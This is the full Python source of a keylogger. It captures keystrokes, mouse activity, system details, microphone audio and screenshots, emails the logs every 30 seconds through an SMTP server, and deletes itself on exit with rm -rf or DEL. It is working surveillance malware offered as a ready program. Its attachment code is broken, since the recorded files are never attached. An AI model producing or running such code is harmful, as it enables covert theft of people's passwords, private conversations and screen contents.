import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from smtplib import SMTPAuthenticationError
import glob

sendReportEvery = 30  # Unit = Seconds // Change if necessary

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Keylogger Is Working..."
        self.email = email
        self.password = password
        self.lock = threading.Lock()  

    def appendlog(self, string):
        with self.lock:  
            self.log += string
    
    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}\n"
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_click = f"Mouse clicked at {x}, {y}\n"
            self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y}\n"
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space: 
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        sender = email
        receiver = email

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))

        try:
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())
                print("Email sent successfully.")
        except SMTPAuthenticationError:
            print("Failed to login. Invalid email or password.")
        except Exception as e:
            print(f"An error occurred: {e}")

    def report(self):
        with self.lock:
            self.send_mail(self.email, self.password, self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        sys_info = f"Hostname: {hostname}\nIP: {ip}\nPlatform: {plat}\nSystem: {system}\nMachine: {machine}\n"
        self.appendlog(sys_info)

    def microphone(self):
        fs = 44100
        seconds = sendReportEvery
        filename = "sound.wav"
        obj = wave.open(filename, 'w')
        obj.setnchannels(1)
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        obj.writeframes(myrecording)
        obj.close()
        self.send_mail(self.email, self.password, f"Audio file attached: {filename}")

    def screenshot(self):
        img = pyscreenshot.grab()
        screenshot_file = "screenshot.png"
        img.save(screenshot_file)
        self.send_mail(self.email, self.password, f"Screenshot attached: {screenshot_file}")

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')

emailAddress = input("Enter your mailtrap username: ")
emailPassword = input("Enter your mailtrap password: ")

final_product = KeyLogger(sendReportEvery, emailAddress, emailPassword)

final_product.run()
